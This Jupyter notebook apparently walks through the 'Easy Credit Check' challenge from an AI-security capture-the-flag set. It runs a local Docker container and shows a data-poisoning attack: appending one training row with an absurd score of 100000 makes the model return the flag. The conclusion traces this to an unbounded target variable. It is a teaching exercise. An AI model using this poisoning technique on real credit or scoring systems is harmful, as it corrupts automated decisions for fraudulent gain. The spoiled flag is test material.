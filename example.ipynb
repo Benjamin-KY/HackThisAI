{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Challenge Setup and Walkthrough for [Easy Credit Check](https://github.com/JosephTLucas/HackThisAI/tree/main/challenge/easy_credit_check)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup\n",
    "Installing dependencies and getting the container started"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import subprocess\n",
    "import time\n",
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%capture\n",
    "!docker build --tag credit_check challenge/easy_credit_check/\n",
    "# Notice that this path assumes the notebook is located in the top level HackThisAI/ directory. If you are creating a similar notebook anywhere, this path needs to point to the directory with the challenge Dockerfile."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%capture\n",
    "subprocess.call(\"docker run -p 5000:5000 credit_check:latest &\", shell=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "WARNING: If you keep running this command, you'll keep creating new containers. It's up to you to kill these in your docker dashboard."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Waiting to make sure container starts.\n"
     ]
    }
   ],
   "source": [
    "print(\"Waiting to make sure container starts.\")\n",
    "time.sleep(10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Function\n",
    "With the container running, we can submit our `.csv` as an `HTTP POST` to `http://localhost:5000/check`. This is just a helper function to submit an answer to the challenge."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def submit_an_answer(file):\n",
    "    with open('challenge/easy_credit_check/'+file, 'rb') as f:\n",
    "        r = requests.post('http://localhost:5000/check', files={'data_file': f})\n",
    "        print(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Working through the Challenge\n",
    "\n",
    "Now that we have everything setup, we'll work through `easy_credit_check`.\n",
    "***\n",
    "**SPOILERS BELOW THIS POINT**.\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's see what we get if we submit the expected training data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You don't qualify. Try again.\n"
     ]
    }
   ],
   "source": [
    "submit_an_answer(\"Mall_Customers.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Well, since that didn't work, let's make a copy of the file and start tampering with it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "!cp challenge/easy_credit_check/Mall_Customers.csv challenge/easy_credit_check/tamper.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We're going to modify the existing dataset by appending another row.\n",
    "# That row is for a 19 year old making $15k, but we're going to try and give them a Score of 100\n",
    "with open('challenge/easy_credit_check/tamper.csv', 'a+') as f:\n",
    "    f.write(\"\\n0201,Female,19,15,100\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You don't qualify. Try again.\n"
     ]
    }
   ],
   "source": [
    "submit_an_answer(\"tamper.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hmm, that still didn't work. How well do you think they clean their data before training?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We're going to modify the existing dataset by appending another row.\n",
    "# That row is for a 19 year old making $15k, but we're going to try and give them a Score of 100000\n",
    "with open('challenge/easy_credit_check/tamper.csv', 'a+') as f:\n",
    "    f.write(\"\\n0201,Female,19,15,100000\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your tampering was too flagrant. You were discovered.\n"
     ]
    }
   ],
   "source": [
    "submit_an_answer(\"tamper.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Okay, so they did some kind of data comparison. We added two rows. Maybe that was too much? Let's start over and just try adding one row."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "!cp challenge/easy_credit_check/Mall_Customers.csv challenge/easy_credit_check/tamper.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('challenge/easy_credit_check/tamper.csv', 'a+') as f:\n",
    "    f.write(\"\\n0201,Female,19,15,100000\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enjoy your Platinum Mall Card: FLAG{HIGHROLLER}\n"
     ]
    }
   ],
   "source": [
    "submit_an_answer(\"tamper.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Conclusion"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Looks like we win! They didn't sanitize or bound their target variable. Even though `score` should be bounded on `[0,100]`, they didn't implement any checks on that before training. We were able to introduce something ridiculous and significantly influence their model with one additional datapoint."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
